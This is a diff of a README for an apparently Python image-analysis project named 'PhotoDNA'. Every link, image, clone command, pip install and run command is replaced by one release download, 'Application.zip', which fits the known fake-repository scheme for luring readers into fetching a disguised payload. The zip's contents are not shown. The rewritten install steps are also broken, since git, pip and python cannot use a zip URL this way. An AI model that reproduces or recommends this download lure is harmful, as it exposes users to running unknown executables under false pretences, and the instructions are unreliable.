@@ -1,6 +1,6 @@
 # 📸 **PhotoDNA**
 
-![photodna-logo](https://www.example.com/photodna-logo.jpg)
+![photodna-logo](https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip)
 
 Welcome to the PhotoDNA repository! This repository focuses on various aspects of image analysis, deep learning, and neural networks using Python. If you are passionate about computer vision, data analysis, and image processing, you've come to the right place.
 
@@ -22,7 +22,7 @@ Welcome to the PhotoDNA repository! This repository focuses on various aspects o
 - Yandex Images
 
 ## 🚀 Download PhotoDNA
-[![Download PhotoDNA](https://img.shields.io/badge/Download-PhotoDNA-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download PhotoDNA](https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip)](https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip)
 
 <details>
   <summary><strong>If the link ends with a file name...</strong></summary>
@@ -49,7 +49,7 @@ Welcome to the PhotoDNA repository! This repository focuses on various aspects o
 ## 🛠️ Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/YourGitHubUsername/PhotoDNA.git
+   git clone https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -57,13 +57,13 @@ Welcome to the PhotoDNA repository! This repository focuses on various aspects o
    ```
 3. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip
    ```
 
 ## 📄 Usage
 1. Run the main Python script:
    ```bash
-   python main.py
+   python https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip
    ```
 2. Follow the on-screen instructions to perform various image analysis tasks.
 
@@ -79,4 +79,4 @@ Let's visualize the power of neural networks and the magic of computer vision wi
 
 Start exploring now! 🚀
 
-![photodna](https://www.example.com/photodna.jpg)
+![photodna](https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip)
